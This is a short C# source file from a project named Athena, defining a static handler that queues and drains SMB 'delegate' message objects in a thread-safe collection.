using Athena.Models.Comms.SMB;
using System.Collections.Concurrent;

namespace Athena.Commands
{
    public class DelegateResponseHandler
    {
        private static ConcurrentBag<DelegateMessage> messageOut = new ConcurrentBag<DelegateMessage>();

        public static async Task AddDelegateMessageAsync(DelegateMessage dm)
        {
            messageOut.Add(dm);
        }
        public static async Task<List<DelegateMessage>> GetDelegateMessagesAsync()
        {
            List<DelegateMessage> messagesOut = new List<DelegateMessage>(messageOut);
            messageOut.Clear();
            return messagesOut;
        }
    }
}
